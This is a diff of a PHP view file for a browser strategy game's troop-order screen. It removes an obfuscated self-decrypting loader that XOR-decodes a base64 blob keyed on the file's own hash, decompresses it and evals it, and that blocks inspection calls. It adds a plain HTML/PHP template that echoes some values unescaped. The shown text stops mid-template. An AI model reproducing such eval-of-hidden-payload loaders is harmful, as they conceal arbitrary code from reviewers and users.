@@ -1,24 +1,1031 @@
-<?php
-$zixvusgt="4cdb88d58074e5da641f450584390239";
-$ukcfhx="00065c550d5c05540c510e0d56535c07000650570c570054000104010057520e";
-$jvgrps="TL/VCtgSuleGnkJ37GdpGn3bt6cHcFfaitCp7FnSuKSA3FXt7vq1Nn/wqfy1RG30hJfXT6C/Z7l/3bzlqWQhtRAlakGHKa4PwhUUq/MGCH46VGey+Znf3MfrXqJdJx/Byh7PoJSPkOiPq1sWbUp7+Me7/vVzXY7v4BrYh/eF/iiQNVIEVzV9kCeQVyCUJy6i57rY4gxsZ/jCxcRmIJwdClYa/kjHgVUvSP+14dIU9cZC0tLKR5C/bjdT3YPb2N971jDcuO2ZuCLKEdPwHG1P2wHVoNQEeYFmPzL8jUx6PsZQc/7gTuR3Q6tWjed4gRYGCVAxqQXmz1+6yqXzmb5e75GaNSg5AIhNRcJNLxTtqZ4viHjOht1HGUjFaLuMmIUFvJOKTwwGGibgnfTC3GtNHNs3eG7sCgVqgffiNbOu6X2RRt7GHYfow5aKwnhHX1rpNvWik0/gbhrrDfzatfgN6R4sWxfeVm9VlBdbQ0Lu/YkpLn3pwlOqQl1gWDJgHssZS4UneCo8qHEYT2zc2Kb3gAZYftTlqDfTQBDeo7hq5nDxZXdI0TrXVj+BjC50/yMikHQcP2egZNSxYTAIIqNt3dnA+fgpOnyHpKIZ2wopJWgpGAfR0w6/51LxdQb7IQqQzw+e99rr9pIRal+VTOkX8O+U3vKrRn5nuyTMwHxlWMK3Tn4C81kg0LCaHiMRR8zxwfwvDiZRYXqSq9l7nVZkqHMbCAwU7JELyuHzdxUbH5Mk/MJFcFFGGSFpxjGB7FIXLDWqXRVb0qlpYT+WstFqcexRz7arF+zavMJ0UNWGyhc4hPOvJfVuzqihThczvj/EnwPUxXn0XKcIN4QYaZG5tVOW4CjCBJ8GCbTQ9a50sf7KRfsU4nGNwJbYT/h6pclb+Gt2Ra/xqmHOvczfn9m76oGuzZMYKan6Csy7BVOGUnfuaG9rFhloNdJqzyLEaLdpTN7r902+swjkBiMXCqTd53m2SdgfLBpYMHE+j2lLQNnkot+RdppjnVV07HaBal4LXcpplI/d9b6VdaxN6lrZ1UfdH7798ydn5t5GF62ituh0sqbwi3+XfFZ+6B7zqSH6hrYGmhwAA1Z0zD4ICm3lWfnMR17X6Rqao+iCpTS4BvRHjb37SHttl2AjUwD5jfIgPhfXqmiW7enpNr2/wdvVvEHxDe3T0035altgcjW0E6L9LG9xI3S8TdVMc64tJSlW2C+WQWH5IGLzx6VjdNDq2qRj/pIQM3Ai+lBVYlzkRo1bTq0tvyjdFl692XA5q5jmiRd5oTGvDXVwSHYLV/uGeU2ZZB27ISQ00Z60s1H8B4z4Kat22sgOmOYMlXfEPaF5vBbMQiUmhP3Ww24xsE8zhjXuXocvKmQ1zf0X5HtLANL8buq0VXi30dadcsOT5uaP0rIssav2FlWPVKcS1V03By8M5sOI9ExgwupETx3DHEp9F/tHp0EQ3XgIcEtF/52GHCABFmghJHykYdO+5h6LVdROZIfngFGmKDfK7o58AV2WlbImo6oZTSdHJdui66wwJQ82pFDYPUxP699c7r6ccDWQvTSi4QJWF0J7lghZbZZ9atAM26U75PszFv3UFPcCkTksNa95ovVaCzjgSKn9dLNzIGOuBPuMPQxryyv2L9kbcv6b0HkFSyJS9VEG0hCLvTUrr93P/TuO73wT7C/bpNyopTn6HLHB9/YP3c0krpUUHMBu3yLPFKZr9PIDI5PbAjpnKrkOAqeW+VKQJQPImf28EKt6mY8iFJgZJrY6NRm+JCZfcitzy+8TFmn1Sk7lJdo+tRCVFasnMXVeDtew/M0opx/KVMXUQdiGtX6uqc75Rm8h+W7vHY7Wjv79u/Q7mPDtjJwzUT6r7TZ1TQqOmxZ3BG5BRmcRFmwsp+uCuwh4oNxWKmq1a+JMcWKWJXgKFpzw9+5JDUrQz21Wlc0Yosdhq/3ZVJpQEF9jZ1oPD6WM/kZ4mYfcoKJrS4V3L2O0RzjU2nRLthtDYPrIRDqhT3duhpfm/warOocsy95VCDzvC00LM/KeTt+p9ow0UxUU5LG5zu13/wd1hSvolQfU2xgqO4ajFmsoSYRrt0JWnI/23DVxoeBBXC7Bqb3ddK9Gw9nF8AEGh7QiQINUrtI7wGsdv9nkx+bkXlWi+NExi5s9/a0yLPOKB/19gpKfX1GCa5ZU3yIwp5gy6ot/ROGgqIiwu6T31B6aNWihBpBjIyDpGLDqiPpmeOsinL2QhoJgB+0AaBh5eDkDPL/AiEJEsaDowBKCLN15RGDXeRL8mboivb+tQ82JHv57dE/6JvUrzhIj+vADKI9HHXlDwDKo/XaPMN2d3bSFceuwE0rPwBlrPgjgFC2d3iHOkcCEszk6pEoz90cL9h7hvYg+eMeeteoJuUq2NZdv+OZaozy0q5+2xkTDCWUPst/pZoPuC+M/Q2Vqac27VMgFwEtTx6Jfn3zFHb9Dk1z3s2K+GYrPzT+iQkEsj0m3VZlZpj6NqRv2rqXPhlnATz8JyO8U0NWXNVmsqTu+TOKkvOAkPT/UeGFk+M/S3Fd72IM9TqK2/pul4Cn/DlTE6dQiRWSuLnlz1hdSL3zuqq+rNdebJf1gE7ACUpr6uN2sLJ2sdJz+cL4nJDmEosMuueRLAsbjmfEKn7Yaaj5QxoXsMzFTA5k2aZPrONhomQS6AJpdrDXHAr/bJRpgx+wVBNfc3ZEQ8SEl3gcFXZUnQt9phN5ilKHg2uuLXyxp97aVwVlmjDASeHK9OYaakVdemBw/XPhMcje6N5SosHTony7aJMQ0Me8Z6LM5kxw5cSfLVYWb+YFZ6FfTFmDpigpZWvwSfNiFe4RddMbe1o4fIwxLQ2pF8MFQuw9Tt2/1ayRmguA3oaV+D2bcDRguswyZ3X6pIo8O4KXYl+sfhHfwF3aqDIzbM4e9rtDHZpK1jpS8knyHJDbSzQfpQZCNpFTtX8Lu1ZT0awfeiacEzqeRwTPs8/C09kCH7PFFvvVGjJnGWeAkllvuiXCGS9ykOBULYtNw2pRKDo+SNYGJ5JDKSDlNaQGW1okcTb2xgMz9zii4uIdet1uAsd91ZoCe7YZEG/zmq8HhIKDhTP3Qaef1otcNgiRII13QZBt9RJeuXqDmrV7NIGGoL7bMhYq7iV713tP5NxuEGLFaQfyHIcUqkLHbXPRdX1atjtxtSd2MTTCtOusZ7aOJMhAltLXSrqmDrY0JzkuMw4/gmrmAaK/eXPgH8VJ1S3mnuUo3PYr1UNjSK02T86gBQz370katP52lqAH5f40RBm7DL3EgIGhGm8WLBo8/b+jNk7VfgyuC8b6Ng6uWfmap+eKi8klMsYDMPQ5PFlasWunmK5Cvols/TtWkV7pefSP+OodY21sTA57fORn/w0Tj1E8vKTy8JZWa9WP8qeOF/2NGkpZ+W+a4SDu4Yx9SPTOjxUy+ZRbXnOgYjvxzURl8l/ejYfYAWdFFsNtGpjgyAgIbUf1SIGbO6UpzjniNoh7nA5CUsJ4CWtBwqf5HYqSxZIOLx302+l3+1HdKy88+S0UA6Zluzhq/nprr6gHlyA67/5tEI4USTqEEBvpLhn+W392ISx/X4sz3pk4r3msW87T2+BhyM49866yXWWv286c6X85GofbmwuLzXTdA+V+YLkhWabEpeblH6QQgeuqolTvd0xgrYPMMfJYSKk9Am1+/E1FXULJ4QLRjV26UboydWfo2MnY05g+8zNzqNWdqo7O8xJKygFje6b9WH5+KpQz9AQd43dNYz12DnLW/C5djLhV22u1dVM8Sp3XMbAfqE4ta27dq2NrFLYM/akOIcgaXp5iHjbJG1onLCvZ1MjMiC3PydesbZ80/VqMh68QsNY9TV0LOa6G+5xKsAO1lEbPrJXnyGYZzCm2BnteelUGBf/DWdCdTMKK/lznLrJvgR/sdzsg5VMcI7zx+TtLyFQdmS3ACSb2wg46T/vbWe4gNbsjRGtd/Mb9HOkzxSRPA1nKF9wvILRho0HiQKWw3nlk0AWtUGvGEeifvXgu4mfUcz1roeHR9HiUoXSnMujGS4Ac1FXEYbL7yLIMi4UZF352klMkVU0Vt6VNaYjBbnbpBN/7zxQ7MpJNGOatgzY2TplnnMo6YJc/3swSfH981Dsoaz6OxU8LQb+Honw11KsTA6cc0zFk8XiPiQ8B9PQsPXxt1aRDaxaTBl7tBAMj8XmFNFlEStYy07JrrJ3VsMY2OruBkROl84Iu7AIkObmZkxYJMDSxzVLvqkelRs2/xiAbr+6saiMkhRNMH1UHwsYsh+KxdiBxAwghggWD7m7UMqGMAp1kl5GkzOhinnszDntcO7mDJFT00bGpyvhlywxORnMkNie4qykEUU+WV4KCVEmoNF2Z0cKf0EBNUJnQLbnu6rI8WoI8yPKLXJJ61MjVW4potAXuY4hBJk1EsJPfU5zq4tn0NrIcu9l9ZoEsP+SfW9743yfkI3CJDubAMXyQIMDeeCPKJn3pEe0KsIY/3PNC8gfvviaNXYyDZ155iPAo+8TJU3NvhOVDzEwAKWIfdh+4ij7RsQ4c7haj/ZbzWlLuOVbAOYTYe4m3JOz4c2ShtFAcjNMGleP8iRSMeMMYQ4m5ImZW1FrjMIgJQgBfguHVc5WSRqb/s56IFLjSbtrrWFhkA+ep4A0u8qhtR3X1BIk30VHLDQ8lg5E1hxK0oYS9Yo1EL+m5r2u5lGqs7H58pcOzWyOGsch63QLcbhAGMn5H07in7Thju3Gsa55EZYGYZtLaGg9MjFtwQrhA2sA+NMSmLafKYXJL3gL4wgA6NUwB3oW/Dp3Wy45s+k/dT40cBajYvE8wOLCrcxzczbDpotV0QGDEhUBUQfMiLCpWhqYleXz+aw427u8vgKSC9D2oa9pSt3k3Gbtf5pNONbAP3omtnXjhQ52PeQB378krwrNeoBgY+0bPkpsoz14UoJo43GbQKDETnfsCZmDEVS0IBvjyjX9bgB1I8HuqVs7De+kqy1pNif756MwjzybGReYGPMx8Y7OXM607YPWUbPv3/pHpJOYchH8F7PCUVmWU3Ceh3xgRnjQ5QhQCAqO0cpa5WlAa4Nu8BOER8dTifCT2Ia8e7u3mGLh3h9m8JfkjnyrGcbHO7sSU4P5NWjU1hC8BY6mk08CoGT1rsDSUQV3wMunFuOGSn2jaZR29vDOvC6vFEiCB7pSZtbznskY7PR3P6ldTl3qxDaNJIprspB6ir7QeJkYKyZqF2ctWkPIQo+CQFFiY/pd9DaetibyZgaJdvLygOG+c0hxNKKCKPP3aoZZQuHWS+5bJaI8W5LZpelm8KS8og3C0PR2UNvVGJ6mibF8QgWfWcTCs/RHmk/472ws8zOxRuP+uQaRCwOKUBmLq1kyfxWD1lFtpxHhJr2oZBgnmAARDYudp1VhBuc76RRb9Epo0DPAhsw+WDX+2ld/TGm08Ut5DDKevupOQ3Ky8bbABI+rMvVUkdAYwdy+9uLsv+0UAF6OBHqjHy7EiAXSUaOwUzC1noXXZbhpbAFVn7BgznIExRuZC9pklx6VBfm2cNyHhM8WJG+3UJatXU2WAIcZaSFrMvbQ3v5c47e4sraMo9+ixEm+6ZylYu5oT2B8CiK3lPedjfMlgKcYM2R58VO+8eDLP88sPkhCBiUFJMGJZFd50J8bcrV3b+VdjJsT9XKdoSy3Vg+RZpZvzE7LCa3BPlYwb4d+IEuZS0EgTGKh5JUORF3IAuqJo2s/BrfyMKleu5qeU1n3zcQ1z8T/wqtMdMM4FcSCF1zeOQ1eK/RtWcmXgVsT6fv2S2Gospfwuyl5BL/bWxog1mQgyaek0ICfA0D5yzQPubQeHzIFdF9EKWTAzhDQpu/ubrfDzOC0zoiEPpK4wVyhgW1CL7XLsDBST1FJyMZRKlDVpZ+2+pIaz1D5e2NucvwdLKB8ZrnTTLwaQWfSGVe9zGIR8UkrlqEM/Pt0ZXmEQnU7oGDipcxBQywHrxt4DGJWoLLpsX6vYkewBYIqfuOC/xnT+UTomjR1+xt5lHMhWDaA9wGUu4dXbeYNyXU3sw/xajJcK11ai8SbgDRsx2xq0supC1ee+uvgvg7/Ybnhgb5y+UIlNLaBnNFwYEtI7gTdvdgc4bE8Kf3I6yjmX7nz6ZHfRr9AxZvZoMuYapjuKLd5uBDrhon8Hzu9YLGvUOsQPjhj2/tKMHCDoY1FvM43B5GIDrTd1bDhxoZCHsy6eLR4Je8yfIPx9GFlNVW1cqcdxqpPu5qiAeqafP/iKJaIbaAjv2R9Z/DgEyDQDYUu0cuWe//3CM9JPBRblm4VIBZv7jsY1XUU5Uym+T7w6nKkuvStzWTyoC1gx4snTkSniNS14IfgHtzI/Ow6AlGAqLy5BibczrMhmPaY6T9g3kk/evteQXgGIkKRBCVGmGfjOPzopTsHiVgURPGWHyX6TGSZg6+eLxWh0LmeipV4wVHu08rU04zS+4Mzh/PnzyCye0JT6yjd298GTruBCyIZDZh8MLIWeS0sQszpK1+rGpK8iAR6976Xj38p3i1BekP+IRaneZE6QTdeSj+oZvcQeQ3glGCLnD0ic79pGEXk7f6TYOF3L1tx1JoZlAzSxkNWIYHbLU0wKuvzyMFqkVB17PZkHVJYt5xvkFo1mz9b+EdU9m0zHid1u9ACS2/+6H6VV1yrAGnosIZTxNgCiNKLci8mqWtnh7C3ksLCh4nz5vbDcVUpi8IiVQ88zFGPeYykmEF5cv1tX/C0W+oC7fMCJxmVACu3xWznAQQGepqvp2xr0pdL9hV+MCqVW9Pvx4eaRyFesVMju8wGRto+ldbMxGkQsTKMUdO9RUjaJkUFiRYT2kS2z05eZxFWDLtXJwEOn5eJgWLCaRhECIMxdX56ApSmU9pZYAZpNN8+0jdYYKKx5w7l9zG6R0X0GuH80hoAzBTW3N9XD06suiSLdLKsapgMl/fijHjSClZxqqAAqSglrzNnrTA9mgOJLlA7I2pYkTKA0I0teKB8AmCTwY/L45PEOQxNlkmJFIY9F29IsxLdh/dw6tljXYGxnQNuZ1xCamgw6ExTaLfK0Sn/Bae/ZfyMYZyoGh52/Nx62koPR3qQ+lrvf7UiIuLHH+tdjzLcvvd4igkTMYZVREZLFVIISthKOqCupmahiH5N2/WzIq0W6QQsSAKWN4/Sw8h142OSFFVzuZHHsYYj/Y+Dc4mpEixRBtoLaPsk4jkemWF842qHv+bdROkNCmMLH9K152wCoLNxf4vTCAipzd8zlYESB+Bbe8zm6MmgxWmR7fZhcyQKw8LKz3kdQipNtYu8ftPfiW3EMZbhgeQWjARe2IfXFeHmC07DfVG//oYv2sI6bpPtdoB9SDxw/pRRuw6sVDYn5Cjo444OD/7b/fkTD28xIFF3BTfiKJ3YzXGZ1ECfLXNnafJt+UWjc9o/EsXH0BFAL2eK3banck78ShjFGZfgLg+sJsuiLLBypgID8C2Z5nGRYGJvyiLsjVOZhIymjCsA7ZgrRXiidDjmBifZiC4eRDnm8z5l0vIHZUJ3PqI//hyM1flDhRrleSF98Gh8HlKbDQQTrES2TLCHQb3nV2hR1wGMRferBbDT44YV4wPzYTGBw7niaPukI4+oSEVFJ82rSjsqB8wTrahqtnvAXpbG1e6GuZqdsAoIRt52fNfnhI2+0/yzuCnaTQG9MbHtVhRWT4EcFziyuep9NM771SaArpoA9irI5X+xccOllGTHY9VDHHYiXo02ARzspoi0xZs0N3Whq6qp/CABAqpC/4fLgHraxSH2JrGj4AreNUm/+k5vdz1JrupeYPpdfcO5Yg8Z9kA5GtSsIHCxmaKSSjzhAsZjFUESiRyze0u0uQ3EDPpTpnli+7SXuIbX0Z6ZJ50pUDhVodlGGYgSXKwoaBjg8eo0JWZKmzwzUMduPcMc0l2qbGf6T1oBC7Y3yeq594WQlbG8Ka9wLfrNrVojEUCaH2mTePTqDFI56CiTP46LPLwoqr22kLjNAlkXFLl6D+TGfflQkf9xMmD/ZuZjUnwPULNmabRfnrdguaoGXRRNWbH0WKnLZJG/bIzlvXi7P0ABUikBPcS7dvtT7bufkr6LUJKTj0L3zSfhdWCZd15cUpj8Ut5ZFnz8LbYMcaau31iU+bOFz7CX2LIQ6lYi+ajDvs9zu2jJgXkBJrY6VtgrhrDIDB5S0S7Wgagk5ICSpcPKvXjy2nQTBA5F5vzwrtrtIEacTMQvX+zPBW0IwocNYTGk1ros7EWKtWZbFgV+QBmX+6J3WZ2Tn7XvvVRu1riBpVNVNXrWdoj7eBPIqolD9hDuMCfQx/NaKpvb8Mnpw1Gcu4qEeJmKZd6cnImQr1Gf9SaB+rFbOGUJL2YuhGC8rxuy31QEw7LF1irHjbtcnEK6Hs2hZOiFpRoasCsyf+/nyGq8+K/caWpEAzK6lgpEfBQz9beXRwwmZm8gayyhI7Xx51rv/lJz4k3nQvWDVleM8dPlhLpRUlEXVFMiQk66O+7znr+atLykIuuQxYxOXpDJKpBJxpE1pYEPngaZq6mJJY3B8rxbpLmVdmyNDeM5+yrFm5dHRI8aQV8fuBuQ9z/TOeZ+hdmrW3pYbd2WcHVuVUkI/PhuH0LzBLiq4jUI+FSU7G7oH9pCTOKoSX7PS/a1pMAaIGE9qp1KrVANfhv46e1B4BwdIxwtUJyhnJ0pKSIruusT4HPldPQBTqoeB+uBC5xk8OnpJTMgmzd8j5psWoJTVaDHD+b7fYXsAaoAuN/lvN4hCwyzeWWY1b1SlmKLbqVJ6w0icp3J8gYz21zuWXvOr9FKsAIcvk3TGohpEZdK0eomK6I1Ec8Vik0fk11kUyv+LgsnDslHKQtX+u+XHSxeKdjVzOyEOAYnOdZlEOuI/JDNCz4ikjHz96P4q9B6QnBDtMKajjE/mTBGv+TurJMjsuufcjVcqXF2GfwiHvBHXamULsMRP4bzLY6VghjZZgorXQQBqH3i/VfYShrZVH7qKHYiVdtcCtakUipyaFKZERHfzZ6qq1VFBgfWbiXgEVH/0AEFkd4Z6ANZahLnKowzF4ipkbMvh3wfKuItc+ON7C5cd0nWvqgLlXoBrWhSVwmnUtssKMf0JgzhlqTzmsEhUpwURjfGMWRAo3+8S6DDMDU/rxBKa+gE18QlL4xcm2rdICOYcHYwuhPPcNWCgRneE1x66Sh6zs5DgyVLYLS7EryJtGuSvaHIL7yEK2Xetqnn7Ky6VReNmS8Rr3wIuqgCN17KPyNKpUp3VYRefswwyK7uyXJ7F5fIsN3IDu6AZAQ7eOVuB2elokW8s12UkgGR9U3EHdm/1bydXgkLWZFfuNVZuOBstTQHGHewOMzoXmPnUnUR+cZVXE5fP8Kq7Shv2rRiWViqOZTSI1b1auBjGikUf66XYN4Vj5UceGe/ocbNgirTgH3pUF4VGWgitG5jWWOUJot3gOx4oPpOX37qS06gBoWiZSOO0b7GIKJmz6bj3GtJKHe0RwWw40lF0DsEmqpRALW3UYaLp3I01OH7Vd5t2copfAXl24ZszputN1vwbCuCDkUSNKFtqu8hNWqYOQtIAkPfq5agepJ/blcj0E3LOMREIxWJUTu8ykrQTDt9FSjQHPbeU46TH/V78VryS1cbwPWnak/ZqzdAAoQfTaH+dqLu6nRFRmSS9GmJS917x9Kz5NDcWnmiwe7AMmW/sq84RFWJj34ESRQw590joSM/W1JAaO59d3Z1+cChhB5O/NQ16MXTzc055IxY3lKuPtXfX9MUmj2fjvuN6ME99csW9+LI8X+dE02evjHVShALXm2/GIgCDqC08+9SZXY5YiswzUuFFwE9S8eV9oo0ZWesWCc/Q1IqknBxFJVmRv1QjN6ve+OIwH+chx3vTxp3eofPEoxubVShC4deGDcuTu9yWlT25GlbH/GehSIjNbcUXu83PAjbwYrBFxu8i9Ygq9kwHfAGVF2t6Rb7wN/FwjGw0IleSOC9/ToPTmpiXECXxwkVPbModio+RBihdzbOqvMmxQVTvm2wuVKbTATPFWjxax+2zYWyuaVaSyCQUXeMyuWSj4ITBpst8kBV3aoqxLgxQ0rsD+k6fTymKJpSvB+txPlGyndTHj2cPpMx3RL8YDu8ZX5Rf+ZoXwgAAlUwjPIZPci5Mr/f8/iC2Lh1CIbPtI9cOOqARv5wWTFV68ZAZuUDn3o81adyy4geaDUjpag1vKavqeRs8/dSUlcN7sryUue333ALSzCJ9yRnCatMBKnqxJPaM11Bs3uZq1KU7nmaUX7BSTI3err/Eq/WV7ucAxBaYeTujVRaNRqsPtFdji8bVre0GDvQsJUDsVzHa04Q0jtoWdB1/Ool1ekUnlPaJeWk+2klLwMfuHsYa1qp+Gzluh3L/pa3qI8jJnDLHuwhyTvad/uqiE+ZI/3UBnVLnnM/BDiuYq0oGE/4P81h1/DTg2Nx/llo60RmNkmlj64gonJ85eMRm8XX+XbffAdyHcdj9lsNyADuiV0irFwkxtt3qhpYztVkSKgzYSUDdymBN4+P8D/a2Tc5A9Ab4nv9tby80AEa7aSTOHh8djIcebPOsdOx8j22V0WbY1iB/MEyBjaL8gwjyoLp03J/0asIM/C+VKFRvW267KGtMvaDGC9ib4RCPRoZ20Ca1/0CEvguNdcDyhpA4fZA4G6b/NVPBpQ9nu0+w+6trhvGv9y8XRez5ou2h/Da55prBmdL1cWTDEDcMOXNtgpL9gBgU3fJ/xaXoG/3zUrLO63XW8naH/osvVEtNLXfRTcKVXsSAsFXc3M+0+zEUA5g4r9C8N91/wxcN6Abjna1cqukGSuHJXir7ftPpcINnl4WfVW40utLu9pSbHMOCwark3rI4Rq6GIZUDyJyBmj5ccSFFgN2FFsHzFSLNjjONhuuydMsyS013hBKHa9gdgxrGBvJXTdLL+xNRdjIZpRserJi/J7x4YsKpCQrG3Raa4hp/HGmvu5uFAJ/RiqIMRiAMZPezddKqbTdxeGxh9sij3Syf5s4yZRzH3wE6GvX++8pjz6hWHsk1hNAxjd1aJi/yE14KbZezzMFk/Rh65OvHge+71rldilgsWRiRQ3W/Ichb930xKhdKsmTtANhtYwUgpAIZxxdohU2KECLBEMkiHK5wnECKAx72AK15kTtgmStzYRqa9hNZjNq/qoHBefXYFPHfj+Md6f+3B2roDQw2K8goZoRnrwNGKCPHEgP0ckPuVJc821xW0bohdRBIkWruUp5sJhbato9gCimkc0p95NG13CHHJufuqHxmNs7wDxz9D2aVeO99qyKJ8nwyjzg2lH042bbSvZ9X6YYCnIBhQCZ9VQxEhhkDf/YlhVP0E6W5IBEQWr+pvius5VDpO9M9NUk/F5OT9AjLhseMgoBVZFPTYDxuAqNDdyEDu1AX2SLvSQCDL9Hfi5qNQ/g7S2nt+fqOT7+SsW9xpkewo3tRpLqxvrYR76LBdddMB2s2blmfXnx1vgOVO28wlkdeAdXTGTzPJQhNju6NIUGfp33pWrMIZnXKMPpDVm3tfQQvA/eohTMVwTfDHtAhRR4bDBBjsjbhj+2Y44khjBFdu3JHGhZsSgbD7HhAAzenGvf1j1rZsgUWHHz6FV4tUsofe9k1KBlatD2MEi4zLFvlaAAiVC/KLu+XN/dw9NiygKJE/Ddd2wUEUSnntrZhpBBrlE37guNdnWOMmaPn8qPtfkMYS85tBkkj1y19Z6qv7sWxY3uN04wjK1YTZHycKUHMlgWdfuTMlbgnWV5uS9dpPhGjnLpEilUZ9bYbeyx9VvjzLvjVNuSi+U3hnHexGGlMi9pWUcW1qrVjzfqwLRIkWbGaHRnA4XIPIN+jycU1YsvMv44w7cXS8lwBrz9JGT/sdeG8ZjHvgRZxOsdW//rGNFUbJLWGvhkbs5KtK3GH41lz17xtP0p2b8G2Cs8QM4F0vlkbjlWuhBbT4VV6bZCh+iy3y0mw/CVid1wjC1Okvh4yQChYaiY+ffEaM3HTtV+b2P9c9nqqaffwlz1pYV9zjGFfgdTSBklSz/Q6gzdtJBmljeGtszYBRkDv0MugjNYbYR93s0CjM5eyR4vGmjo3ErW8J4/++x2LtUgRrEH7UDWIewBrmgAN/DYkK/wrZGMlV1QzqDNX3LNx/xbmbjRP7jgGBlKxVhgcsnh+3+ne7PkP2gusGzuXw9kH/Z5jK0PEyU7kx27c+dc60a/EZ490l3qZMjRpad4F18Z6HQpgUJp38Ri9JwcyFDzhWMgKe26S/kha+Cyer/+gPfIShHUvbcyk5wr3nQ8oB2yCZQdm4KGAhSrI8yGOpjKEfGZ8ZcliSbcELBXsmVx1UoXZ4tAZ5Y2gzqribSEFhl7X6GVqlvtozf4KJr6RbvpJSA8sofFQO7c/8F67cEUd0cfPRsXBGxxN7yfkfkz9cRr/MMAJKfZeJLm/AzmfD5UCJyKgTP/6zQvJA1Y7BYu6HTYG/5/uczY6UpBQ5nMGtfV/lGR6w3kUu2ZJ+zRzoxjyvzomD";
-$qkkuaujh=file_get_contents(__FILE__);
-$jouiyyuz=str_replace($jvgrps,"",$qkkuaujh);
-if(strpos($jouiyyuz,"ec"."ho")!==false||strpos($jouiyyuz,"pr"."int")!==false||strpos($jouiyyuz,"var_"."dump")!==false||strpos($jouiyyuz,"file_put_"."contents")!==false||strpos($jouiyyuz,"fw"."rite")!==false){die();}
-$jzyqobprm=str_replace(array($zixvusgt,$ukcfhx),array("SP_7a05992c","KP_c36b72d4"),$qkkuaujh);
-$ibsatpiawxy=md5($jzyqobprm);
-$bqftnng=hex2bin($ukcfhx);
-$qbvbofhd="";
-$yolljp=strlen($ibsatpiawxy);
-for($dwdeerp=0;$dwdeerp<$yolljp;$dwdeerp++){
-$qbvbofhd.=chr(ord($bqftnng[$dwdeerp])^ord($ibsatpiawxy[$dwdeerp]));
+
+
+<style>
+#place_autocomplete_dropdown {
+    display: none;
+    position: absolute;
+    z-index: 99999;
+    border: 1px solid #7d510f;
+    background: #f4e4bc;
+    max-height: 300px;
+    overflow-y: auto;
+    box-shadow: 0px 4px 8px rgba(0,0,0,0.3);
+    transform: translateY(-100%);
+    margin-top: -2px;
 }
-$eohzlgive=base64_decode($jvgrps);
-$hcexyurr=strlen($eohzlgive);
-$gbhorafqy="";
-$miqzsnde=strlen($qbvbofhd);
-for($dwdeerp=0;$dwdeerp<$hcexyurr;$dwdeerp++){
-$gbhorafqy.=$eohzlgive[$dwdeerp]^$qbvbofhd[$dwdeerp%$miqzsnde];
+.autocomplete-item {
+    display: flex;
+    align-items: center;
+    padding: 6px 10px;
+    border-bottom: 1px solid #7d510f;
+    cursor: pointer;
+    background: #f4e4bc;
+    color: #000;
 }
-$pmvzxcma="gzun"."compress";
-eval('?>' . $pmvzxcma($gbhorafqy) . '<?php ');
+.autocomplete-item:hover {
+    background-color: #e3d5b3;
+}
+.autocomplete-item img {
+    width: 38px;
+    height: 38px;
+    margin-right: 12px;
+    object-fit: contain;
+}
+.autocomplete-details {
+    flex: 1;
+    font-size: 11px;
+    line-height: 1.4;
+    text-align: left;
+}
+</style>
+
+<?php if (!empty($error)): ?>
+    <div style="color:red; font-size:large"><?= $error ?></div>
+<?php endif; ?>
+
+<h3><?= __('screens.place.give_order') ?></h3>
+
+<form name="kingsage" action="game.php?village=<?= $village['id'] ?>&screen=place&try=confirm" method="post">
+    <table>
+        <tr>
+            <?php $counter = 0; ?>
+            <?php foreach ($group_units as $group_name => $value): ?>
+                <td width="150" valign="top">
+                    <table class="vis" width="100%">
+                        <?php foreach ($group_units[$group_name] as $dbname): ?>
+                            <?php $counter++; ?>
+                            <tr>
+                                <td>
+                                    <a href="#" onclick="showUnitModal('<?= $dbname ?>'); return false;"><img
+                                            src="/graphic/unit/<?= $dbname ?>.png" title="<?= $cl_units->get_name($dbname) ?>"
+                                            alt="" /></a>
+                                    <input name="<?= $dbname ?>" type="text" size="5" max_value="<?= $units[$dbname] ?>"
+                                        tabindex="<?= $counter ?>" value="<?= $values[$dbname] ?? '' ?>" />
+                                    <a
+                                        href="javascript:insertUnit(document.forms[0].<?= $dbname ?>, <?= $units[$dbname] ?>)">(<?= $units[$dbname] ?>)</a>
+                                </td>
+                            </tr>
+                        <?php endforeach; ?>
+                    </table>
+                </td>
+            <?php endforeach; ?>
+        </tr>
+    </table>
+
+    <span style="font-weight:bold; color: #804000; cursor: pointer;" class="click"
+        onclick="selectCoiningNoneMax('<?= __('screens.place.all_troops') ?>', '<?= __('screens.place.unselect_all') ?>');return false;">
+        <span id="select_all_1" class="link">
+            <?= __('screens.place.all_troops') ?>
+        </span>
+    </span>
+
+
+    <div id="inline_popup" style="display: none; position: absolute; clear: both;">
+        <table cellspacing="0" cellpadding="0"
+            class="<?php if (($graphic ?? '') == '1'): ?>content-border<?php else: ?>main<?php endif; ?>">
+            <tr>
+                <th>
+                    <div id="inline_popup_menu" style="text-align: right;">
+                        <a href="javascript:inlinePopupClose()"><?= __('screens.place.close') ?></a>
+                    </div>
+                </th>
+            </tr>
+            <tr>
+                <td>
+                    <h3><?= __('screens.place.targets') ?></h3>
+                    <div>
+
+                        <div id="inline_popup_content" style="height: 340px; overflow: auto;">
+                            <img src="/graphic/new/throbber.gif" alt="<?= __('screens.place.loading') ?>" />
+                        </div>
+                    </div>
+                </td>
+            </tr>
+        </table>
+    </div>
+
+    <!-- Catapult Target Selector -->
+    <div id="catapult_target_container" style="display: none; margin-top: 10px;">
+        <table class="vis">
+            <tr>
+                <th><?= __('screens.place.catapult_target') ?>:</th>
+                <td>
+                    <select name="building" size="1">
+                        <?php foreach ($cl_builds->get_array("dbname") as $dbname): ?>
+                            <option value="<?= $dbname ?>"><?= $cl_builds->get_name($dbname) ?></option>
+                        <?php endforeach; ?>
+                    </select>
+                </td>
+            </tr>
+        </table>
+    </div>
+
+    <table>
+        <tr>
+            <!-- Left Column: The new standalone Destination block -->
+            <td valign="top" style="padding-right: 15px;">
+                <table class="vis" style="border-collapse: collapse; border: 1px solid #7d510f;">
+                    <tr>
+                        <th style="background-color: #c1a264; color: #fff; text-align: left; padding: 3px; font-weight: bold;"><?= __('screens.market.destination') ?? 'Destination' ?></th>
+                    </tr>
+                    <tr>
+                        <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 4px; white-space: nowrap;">
+                            <input type="radio" name="target_type" value="coords" id="tt_coords" checked> <label for="tt_coords"><?= __('screens.market.coords') ?? 'Coordinates' ?></label>
+                            <input type="radio" name="target_type" value="village_name" id="tt_vname"> <label for="tt_vname"><?= __('screens.market.village_name') ?? 'Village name' ?></label>
+                            <input type="radio" name="target_type" value="player_name" id="tt_pname"> <label for="tt_pname"><?= __('screens.market.player_name') ?? 'Player name' ?></label>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td style="background-color: #f4e4bc; border: 1px solid #7d510f; padding: 5px; width: 330px; box-sizing: border-box;">
